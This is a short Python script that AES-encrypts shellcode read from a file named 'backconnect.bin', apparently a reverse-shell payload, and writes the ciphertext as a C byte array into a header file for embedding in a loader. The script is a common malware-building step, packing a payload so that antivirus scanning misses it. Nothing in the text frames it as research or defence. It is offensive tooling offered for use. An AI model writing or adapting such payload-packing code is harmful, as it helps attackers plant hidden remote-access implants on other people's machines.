from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import os

key = b'ThisIsA16ByteKey'
iv = os.urandom(16)

with open("backconnect.bin", "rb") as f:
    shellcode = f.read()

cipher = AES.new(key, AES.MODE_CBC, iv)
enc = cipher.encrypt(pad(shellcode, 16))

with open("embedded_payload.h", "w") as f:
    f.write("unsigned char payload[] = {")
    for b in iv + enc:
        f.write(f"0x{b:02x},")
    f.write("};\n")
    f.write(f"unsigned int payload_len = {len(iv + enc)};\n")
